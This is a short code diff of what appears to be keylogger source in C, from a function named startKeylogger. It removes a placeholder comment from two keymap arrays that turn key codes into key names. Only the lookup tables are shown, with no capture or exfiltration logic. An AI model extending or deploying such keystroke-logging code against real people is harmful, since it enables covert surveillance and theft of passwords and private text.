@@ -275,7 +275,7 @@ void startKeylogger(const char* logfile) {
         "o", "p", "[", "]", "ENTER", "LEFTCTRL", "a", "s", "d", "f", "g", "h",
         "j", "k", "l", ";", "'", "`", "LEFTSHIFT", "\\", "z", "x", "c", "v",
         "b", "n", "m", ",", ".", "/", "RIGHTSHIFT", "KP*",
-        "LEFTALT", "SPACE", "CAPSLOCK", /* Add more keys as needed */
+        "LEFTALT", "SPACE", "CAPSLOCK", 
     };
 
     const char* keymap_upper[] = {
@@ -284,7 +284,7 @@ void startKeylogger(const char* logfile) {
         "O", "P", "{", "}", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H",
         "J", "K", "L", ":", "\"", "~", "LEFTSHIFT", "|", "Z", "X", "C", "V",
         "B", "N", "M", "<", ">", "?", "RIGHTSHIFT", "KP*",
-        "LEFTALT", "SPACE", "CAPSLOCK", /* Add more keys as needed */
+        "LEFTALT", "SPACE", "CAPSLOCK", 
     };
 
     // Track modifier states
